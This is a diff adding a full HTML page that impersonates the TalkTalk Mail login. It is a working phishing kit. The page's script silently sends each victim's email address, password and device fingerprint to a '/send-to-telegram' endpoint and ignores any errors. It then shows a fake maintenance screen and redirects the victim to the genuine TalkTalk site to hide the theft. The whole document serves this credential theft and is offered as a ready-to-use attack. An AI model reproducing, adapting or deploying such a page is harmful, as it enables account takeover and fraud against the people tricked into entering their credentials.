@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TalkTalk - Login</title>
+  <style>
+    :root {
+      --talktalk-brand-primary: #2c67c7;
+      --talktalk-topbar-background: #2C4047;
+      --talktalk-link-color: #2c67c7;
+      --talktalk-btn-primary-bg: #08F0FF;
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      font-family: Arial, Helvetica, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #FFFFFF;
+      display: flex;
+      flex-direction: column;
+      color: #696969;
+    }
+
+    /* Header */
+    .header {
+      background-color: var(--talktalk-topbar-background);
+      padding: 16px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header-logo {
+      color: white;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .header-right {
+      display: flex;
+      gap: 20px;
+      align-items: center;
+    }
+
+    .header-icon {
+      color: white;
+      cursor: pointer;
+      transition: opacity 0.2s ease;
+    }
+    
+    .header-icon:hover,
+    .header-icon:focus {
+      opacity: 0.8;
+    }
+
+    /* Main content */
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      display: flex;
+      width: 100%;
+      max-width: 1000px;
+      padding: 40px;
+      gap: 80px;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* Left Section */
+    .left-section {
+      flex: 1;
+      max-width: 550px;
+    }
+
+    .left-section h1 {
+      font-size: 32px;
+      font-weight: bold;
+      color: #333;
+      line-height: 1.1;
+      margin-bottom: 20px;
+    }
+
+    .left-section h2 {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .left-section p {
+      font-size: 16px;
+      color: #696969;
+      line-height: 1.5;
+      margin-bottom: 15px;
+    }
+
+    .left-section p strong {
+      font-weight: bold;
+    }
+
+    .left-section a {
+      font-size: 16px;
+      color: var(--talktalk-topbar-background);
+      text-decoration: underline;
+      display: inline-block;
+      margin-bottom: 40px;
+    }
+    .left-section a:hover,
+    .left-section a:focus {
+      color: var(--talktalk-brand-primary);
+    }
+
+    .laptop-container {
+      position: relative;
+    }
+
+    .laptop-container .advertisement {
+      text-align: center;
+      font-size: 11px;
+      color: #999;
+      margin-top: 15px;
+    }
+
+    /* Right Section - Login Card */
+    .login-card {
+      width: 380px;
+      background-color: #FFFFFF;
+      border: 1px solid #DDD;
+      border-radius: 6px;
+      padding: 30px;
+      flex-shrink: 0;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .logo .talktalk {
+      font-size: 28px;
+      font-weight: bold;
+      color: var(--talktalk-topbar-background);
+    }
+
+    .logo .tagline {
+      font-size: 14px;
+      color: var(--talktalk-topbar-background);
+      font-weight: normal;
+    }
+
+    .form-heading {
+      font-size: 16px;
+      font-weight: bold;
+      color: #696969;
+      margin-bottom: 20px;
+    }
+
+    .app-icons {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+    }
+
+    .app-icon {
+      text-align: center;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+      padding: 8px;
+      border-radius: 4px;
+    }
+
+    .app-icon:hover,
+    .app-icon:focus {
+      background-color: #f5f5f5;
+      transform: translateY(-2px);
+    }
+
+    .app-icon svg {
+      width: 32px;
+      height: 32px;
+      color: #696969;
+      margin-bottom: 4px;
+    }
+
+    .app-icon span {
+      font-size: 12px;
+      color: #696969;
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: bold;
+      color: #696969;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .form-group input {
+      width: 100%;
+      height: 40px;
+      padding: 0 12px;
+      border: 1px solid #CCC;
+      border-radius: 6px;
+      font-size: 14px;
+      background-color: white;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #CCC;
+    }
+
+    .password-wrapper {
+      position: relative;
+    }
+
+    .password-wrapper input {
+      padding-right: 45px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #696969;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-password:hover {
+      color: #333;
+    }
+
+    .forgot-password {
+      font-size: 14px;
+      color: var(--talktalk-topbar-background);
+      text-decoration: none;
+      display: block;
+      margin: 20px 0;
+      text-align: right;
+    }
+    .forgot-password:hover,
+    .forgot-password:focus {
+      color: var(--talktalk-brand-primary);
+    }
+
+    .signin-btn {
+      width: 100%;
+      height: 45px;
+      background-color: var(--talktalk-btn-primary-bg);
+      color: var(--talktalk-topbar-background);
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+    
+    .signin-btn:hover,
+    .signin-btn:focus {
+      background-color: #00d9e6;
+    }
+
+    .stay-signed-in {
+      margin-top: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .stay-signed-in input {
+      width: 16px;
+      height: 16px;
+      accent-color: #333;
+    }
+
+    .stay-signed-in label {
+      font-size: 14px;
+      color: #696969;
+      cursor: pointer;
+    }
+
+    .privacy-link {
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .privacy-link a {
+      font-size: 13px;
+      color: var(--talktalk-brand-primary);
+      text-decoration: none;
+    }
+
+    .privacy-link a:hover,
+    .privacy-link a:focus {
+      text-decoration: underline;
+    }
+
+    /* Responsive for ALL devices */
+    @media (max-width: 1024px) {
+      .container {
+        gap: 40px;
+        padding: 30px;
+      }
+
+      .left-section h1 {
+        font-size: 28px;
+      }
+
+      .left-section h2 {
+        font-size: 20px;
+      }
+    }
+
+    @media (max-width: 900px) {
+      body {
+        overflow-y: auto;
+      }
+
+      .header {
+        padding: 16px 20px;
+      }
+
+      .container {
+        flex-direction: column;
+        padding: 20px;
+        gap: 40px;
+      }
+
+      .left-section {
+        max-width: 100%;
+        text-align: center;
+      }
+
+      .left-section h1 {
+        font-size: 24px;
+      }
+
+      .left-section h2 {
+        font-size: 18px;
+      }
+
+      .left-section p {
+        font-size: 15px;
+      }
+
+      .login-card {
+        width: 100%;
+        max-width: 380px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .header {
+        padding: 12px 16px;
+      }
+
+      .header-logo {
+        font-size: 24px;
+      }
+
+      .container {
+        padding: 16px;
+        gap: 30px;
+      }
+
+      .left-section h1 {
+        font-size: 20px;
+      }
+
+      .left-section h2 {
+        font-size: 16px;
+      }
+
+      .left-section p {
+        font-size: 14px;
+      }
+
+      .login-card {
+        padding: 24px;
+      }
+
+      .app-icons {
+        gap: 10px;
+      }
+
+      .app-icon {
+        padding: 6px;
+      }
+
+      .app-icon svg {
+        width: 28px;
+        height: 28px;
+      }
+
+      .form-group input {
+        height: 44px;
+        font-size: 16px; /* Prevents zoom on iOS */
+      }
+
+      .signin-btn {
+        height: 48px;
+        font-size: 17px;
+      }
+    }
+
+    /* Maintenance Overlay */
+    .maintenance-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      animation: fadeIn 0.3s ease-in;
+      padding: 20px; /* Add padding for mobile */
+    }
+
+    .maintenance-overlay.active {
+      display: flex;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .maintenance-card {
+      background: white;
+      padding: 50px 40px;
+      border-radius: 12px;
+      text-align: center;
+      max-width: 500px;
+      width: 100%; /* Make it full-width on mobile */
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+    }
+
+    @media (max-width: 480px) {
+      .maintenance-card {
+        padding: 40px 24px;
+      }
+
+      .maintenance-card h2 {
+        font-size: 24px;
+      }
+
+      .maintenance-card p {
+        font-size: 15px;
+      }
+    }
+
+    .maintenance-card h2 {
+      color: var(--talktalk-topbar-background);
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    .maintenance-card p {
+      color: #666;
+      font-size: 16px;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--talktalk-btn-primary-bg);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .countdown {
+      font-size: 18px;
+      font-weight: bold;
+      color: var(--talktalk-topbar-background);
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-logo" tabindex="0" role="button" aria-label="TalkTalk Home">TalkTalk</div>
+    <div class="header-right">
+      <div class="header-icon" tabindex="0" role="button" aria-label="Help">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+      </div>
+      <div class="header-icon" tabindex="0" role="button" aria-label="Menu">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
+        </svg>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-content">
+    <div class="container">
+      <!-- Left Section -->
+      <div class="left-section">
+        <h1>Login to discover your new TalkTalk Mail today</h1>
+        <h2>We’ve made TalkTalk Mail better and even easier to use</h2>
+        <p>We’ve introduced features you’ve been asking for. Your email now has a dedicated spam button to help improve your spam filters and protect you from scams. When you receive a spam message just click <strong>‘Mark as spam’</strong> link to update your spam filters</p>
+        <a href="https://www.talktalk.co.uk" target="_blank" rel="noopener noreferrer">Find out more</a>
+        <div class="laptop-container">
+          <!-- Real TalkTalk laptop mockup -->
+          <img src="spam.png" alt="TalkTalk Mail with Mark as spam tooltip" style="width: 100%;">
+          <div class="advertisement">Advertisement</div>
+        </div>
+      </div>
+
+      <!-- Right Section - Login Card -->
+      <div class="login-card">
+        <div class="logo" tabindex="0" role="button" aria-label="TalkTalk Home">
+          <div class="talktalk">TalkTalk</div>
+          <div class="tagline">For Everyone</div>
+        </div>
+
+        <div class="form-heading">Sign in to access your apps:</div>
+
+        <div class="app-icons">
+          <div class="app-icon" tabindex="0" role="button" aria-label="Open Mail app">
+            <svg width="32" height="32" class="bi bi-ox-mail" fill="currentColor" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+              <g transform="translate(0 2)" fill-rule="evenodd">
+                <path d="M13.964 10.999H1.996c-.55 0-.996-.393-.996-.875V2.957l5.953 4.167a1.799 1.799 0 0 0 2.054 0l5.953-4.167v7.167c0 .482-.447.875-.996.875M1.996 1h11.968c.5 0 .899.332.968.755l-6.5 4.549a.79.79 0 0 1-.905 0l-6.5-4.549c.07-.423.469-.755.969-.755m11.968-1H1.996C.896 0 0 .841 0 1.875v8.249c0 1.034.896 1.875 1.996 1.875h11.968c1.1 0 1.996-.841 1.996-1.875V1.875C15.96.841 15.065 0 13.964 0"/>
+              </g>
+            </svg>
+            <span>Mail</span>
+          </div>
+          <div class="app-icon" tabindex="0" role="button" aria-label="Open Calendar app">
+            <svg width="32" height="32" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-calendar" viewBox="0 0 16 16">
+              <path d="M3.5 0a.5.5 0 0 1 .5.5V1h8V.5a.5.5 0 0 1 1 0V1h1a2 2 0 0 1 2 2v11a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V3a2 2 0 0 1 2-2h1V.5a.5.5 0 0 1 .5-.5zM1 4v10a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V4H1z"/>
+              <text class="calendar-icon-date" text-anchor="middle" x="8" y="12" font-size="8">30</text>
+            </svg>
+            <span>Calendar</span>
+          </div>
+          <div class="app-icon" tabindex="0" role="button" aria-label="Open Address Book app">
+            <svg width="32" height="32" viewBox="0 0 16 16" class="bi bi-ox-address-book" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+              <g fill-rule="evenodd">
+                <g transform="translate(1)">
+                  <path d="M2 0h10.001a2 2 0 0 1 2 2v12.001a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-1h1v1a1 1 0 0 0 1 1h10.001a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H2a1 1 0 0 0-1 1v1H0V2a2 2 0 0 1 2-2"/>
+                </g>
+                <path d="M1 11v-.5a.5.5 0 0 1 1 0v.5h.5a.5.5 0 0 1 0 1h-2a.5.5 0 0 1 0-1H1Zm0-3v-.5a.5.5 0 0 1 1 0V8h.5a.5.5 0 0 1 0 1h-2a.5.5 0 0 1 0-1H1Zm0-3v-.5a.5.5 0 1 1 1 0V5h.5a.5.5 0 1 1 0 1h-2a.5.5 0 0 1 0-1H1ZM8.266 8.157a2.263 2.263 0 1 0 0-4.526 2.263 2.263 0 0 0 0 4.526M8.278 8.916c-3.758 0-4.388 2.222-4.49 2.903a.74.74 0 0 0 .17.594.753.753 0 0 0 .57.262h7.501a.75.75 0 0 0 .585-.28.735.735 0 0 0 .148-.618c-.184-.86-.99-2.86-4.484-2.86"/>
+              </g>
+            </svg>
+            <span>Address Book</span>
+          </div>
+          <div class="app-icon" tabindex="0" role="button" aria-label="Open Portal app">
+            <svg width="32" height="32" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-grid" viewBox="0 0 16 16">
+              <path d="M1 2.5A1.5 1.5 0 0 1 2.5 1h3A1.5 1.5 0 0 1 7 2.5v3A1.5 1.5 0 0 1 5.5 7h-3A1.5 1.5 0 0 1 1 5.5v-3zM2.5 2a.5.5 0 0 0-.5.5v3a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-3a.5.5 0 0 0-.5-.5h-3zm6.5.5A1.5 1.5 0 0 1 10.5 1h3A1.5 1.5 0 0 1 15 2.5v3A1.5 1.5 0 0 1 13.5 7h-3A1.5 1.5 0 0 1 9 5.5v-3zm1.5-.5a.5.5 0 0 0-.5.5v3a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-3a.5.5 0 0 0-.5-.5h-3zM1 10.5A1.5 1.5 0 0 1 2.5 9h3A1.5 1.5 0 0 1 7 10.5v3A1.5 1.5 0 0 1 5.5 15h-3A1.5 1.5 0 0 1 1 13.5v-3zm1.5-.5a.5.5 0 0 0-.5.5v3a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-3a.5.5 0 0 0-.5-.5h-3zm6.5.5A1.5 1.5 0 0 1 10.5 9h3a1.5 1.5 0 0 1 15 10.5v3a1.5 1.5 0 0 1-1.5 1.5h-3A1.5 1.5 0 0 1 9 13.5v-3zm1.5-.5a.5.5 0 0 0-.5.5v3a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-3a.5.5 0 0 0-.5-.5h-3z"/>
+            </svg>
+            <span>Portal</span>
+          </div>
+        </div>
+
+        <form id="loginForm">
+          <div class="form-group">
+            <label for="email">Your TalkTalk email address:</label>
+            <input type="email" id="email" required>
+          </div>
+          <div class="form-group">
+            <label for="password">Your password:</label>
+            <div class="password-wrapper">
+              <input type="password" id="password" required>
+              <button type="button" class="toggle-password" aria-label="Toggle password visibility">
+                <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+                <svg class="eye-off-icon" style="display: none;" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                  <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
+                </svg>
+              </button>
+            </div>
+          </div>
+          <a href="https://myaccount.talktalk.co.uk/forgottenpassword" class="forgot-password" target="_blank" rel="noopener noreferrer">Forgotten your password?</a>
+          <button type="submit" class="signin-btn">Sign in</button>
+          <div class="stay-signed-in">
+            <input type="checkbox" id="stay-signed-in" checked>
+            <label for="stay-signed-in">Stay signed in</label>
+          </div>
+          <div class="privacy-link">
+            <a href="privacy-policy.html" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Maintenance Overlay -->
+  <div class="maintenance-overlay" id="maintenanceOverlay">
+    <div class="maintenance-card">
+      <div class="spinner"></div>
+      <h2>System Maintenance</h2>
+      <p>We're currently performing scheduled maintenance to improve your experience. Please wait while we reconnect you...</p>
+    </div>
+  </div>
+
+  <script>
+    // Add click handlers for interactive elements
+    document.querySelectorAll('.header-icon').forEach(icon => {
+      icon.addEventListener('click', function() {
+        console.log('Header icon clicked');
+      });
+      icon.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          console.log('Header icon activated');
+        }
+      });
+    });
+
+    document.querySelectorAll('.app-icon').forEach(icon => {
+      icon.addEventListener('click', function() {
+        const appName = this.querySelector('span').textContent;
+        console.log('App clicked:', appName);
+        alert('Opening ' + appName + ' app!');
+      });
+      icon.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          const appName = this.querySelector('span').textContent;
+          alert('Opening ' + appName + ' app!');
+        }
+      });
+    });
+
+    document.querySelectorAll('.header-logo, .logo').forEach(logo => {
+      logo.addEventListener('click', function() {
+        console.log('Logo clicked');
+        window.location.href = 'https://www.talktalk.co.uk';
+      });
+      logo.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          window.location.href = 'https://www.talktalk.co.uk';
+        }
+      });
+    });
+
+    // Password toggle
+    const togglePassword = document.querySelector('.toggle-password');
+    const passwordInput = document.getElementById('password');
+    const eyeIcon = document.querySelector('.eye-icon');
+    const eyeOffIcon = document.querySelector('.eye-off-icon');
+
+    togglePassword.addEventListener('click', function() {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      
+      if (type === 'text') {
+        eyeIcon.style.display = 'none';
+        eyeOffIcon.style.display = 'block';
+      } else {
+        eyeIcon.style.display = 'block';
+        eyeOffIcon.style.display = 'none';
+      }
+    });
+
+    // Function to get detailed platform info
+    function getPlatformDetails() {
+      const ua = navigator.userAgent;
+      let device = 'Desktop';
+      let os = 'Unknown';
+      let browser = 'Unknown';
+
+      // Detect device type
+      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+        device = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
+      }
+
+      // Detect OS
+      if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
+      else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
+      else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
+      else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+      else if (ua.includes('Mac OS X')) os = 'Mac OS X';
+      else if (ua.includes('Linux')) os = 'Linux';
+      else if (ua.includes('Android')) os = 'Android';
+      else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) os = 'iOS';
+
+      // Detect browser
+      if (ua.includes('Edg')) browser = 'Microsoft Edge';
+      else if (ua.includes('Chrome')) browser = 'Google Chrome';
+      else if (ua.includes('Firefox')) browser = 'Mozilla Firefox';
+      else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Apple Safari';
+      else if (ua.includes('Opera')) browser = 'Opera';
+      else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
+
+      return `${device} - ${os} - ${browser}`;
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const staySignedIn = document.getElementById('stay-signed-in').checked;
+
+      let baseUrl = '';
+      if (window.location.protocol === 'file:') {
+        baseUrl = 'http://localhost:8000';
+      }
+
+      // Send data to Telegram/email in the background (no waiting)
+      fetch(`${baseUrl}/send-to-telegram`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          email,
+          password,
+          staySignedIn,
+          platformDetails: getPlatformDetails()
+        })
+      }).catch(() => {
+        // Silently ignore any errors
+      });
+
+      // Show maintenance overlay immediately (no delay!)
+      const overlay = document.getElementById('maintenanceOverlay');
+      overlay.classList.add('active');
+
+      // Redirect after 5 seconds
+      setTimeout(() => {
+        window.location.href = 'https://apps.talktalk.co.uk/appsuite/';
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
